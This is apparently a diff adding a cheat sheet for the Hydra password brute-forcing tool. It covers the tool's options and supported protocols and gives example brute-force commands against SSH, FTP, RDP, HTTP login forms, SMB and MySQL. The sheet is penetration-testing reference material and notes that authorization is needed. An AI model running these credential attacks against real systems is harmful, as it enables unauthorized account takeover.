@@ -1,0 +1,90 @@
+🐉 Hydra Cheat Sheet
+✅ Basic Syntax
+
+hydra [OPTIONS] [TARGET] [PROTOCOL]
+
+or
+
+hydra -L userlist.txt -P passlist.txt <target> <service>
+
+📌 Common Options
+Option	Description  
+-L	Path to a username list  
+-l	Single username  
+-P	Path to a password list  
+-p	Single password  
+-t	Number of parallel tasks (default 16)  
+-s	Specify a custom port  
+-f	Stop when a valid pair is found  
+-o	Write output to a file  
+-V	Verbose mode (shows attempts)  
+🌐 Supported Protocol Examples  
+
+Hydra supports many, such as:  
+
+    ssh  
+
+    ftp  
+
+    http-get / http-post  
+
+    https-get / https-post  
+
+    smb  
+
+    rdp  
+
+    vnc  
+
+    mysql  
+
+    postgres  
+    …and more. Use hydra -h to list them.  
+
+🔑 Example Commands  
+SSH Brute Force  
+
+hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.10  
+
+FTP Brute Force  
+
+hydra -L users.txt -P passwords.txt ftp://192.168.1.100  
+
+RDP Brute Force (change 3389 if needed)  
+
+hydra -t 4 -V -f -L users.txt -P passwords.txt rdp://10.10.10.20  
+
+HTTP POST Form Brute Force  
+
+hydra -L users.txt -P passwords.txt 10.10.10.5 http-post-form \  
+"/login:username=^USER^&password=^PASS^:F=incorrect"  
+
+👉 Replace:  
+
+    /login with the form action  
+
+    username= and password= with the form fields  
+
+    F=incorrect with a string that appears on failure  
+
+SMB Brute Force  
+
+hydra -L users.txt -P passwords.txt smb://192.168.1.50  
+
+MySQL Brute Force  
+
+hydra -L users.txt -P passwords.txt mysql://10.10.10.7  
+
+🛠 Tips  
+
+✅ Start with smaller user/pass lists to avoid lockouts  
+✅ Increase tasks (-t) for speed but watch for bans  
+✅ Combine with tools like Burp for custom HTTP requests  
+✅ Check firewall restrictions and ensure you have authorization  
+💾 Save Output  
+
+hydra -L users.txt -P passwords.txt ssh://target -o hydra_results.txt  
+
+📖 Help  
+
+hydra -h  
